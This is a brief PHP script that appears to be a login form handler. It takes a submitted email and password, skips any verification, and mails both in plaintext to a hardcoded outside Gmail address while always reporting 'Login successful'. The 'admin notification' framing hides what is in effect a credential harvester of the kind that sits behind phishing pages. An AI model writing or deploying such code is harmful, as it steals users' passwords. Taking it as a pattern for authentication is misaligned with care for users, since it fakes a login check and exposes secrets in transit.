<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Check login details against database here (this example skips database checking)
    
    // Send email to admin
    $adminEmail = "syedakifali712@gmail.com"; // Replace with your admin email
    $subject = "User Login Notification";
    $message = "A user has logged in with the following details:\nEmail: $email\nPassword: $password";
    $headers = "From: no-reply@yourdomain.com"; // Replace with your domain

    if (mail($adminEmail, $subject, $message, $headers)) {
        echo "Login successful. Notification sent to admin.";
    } else {
        echo "Login successful. Failed to send notification to admin.";
    }
}
?>
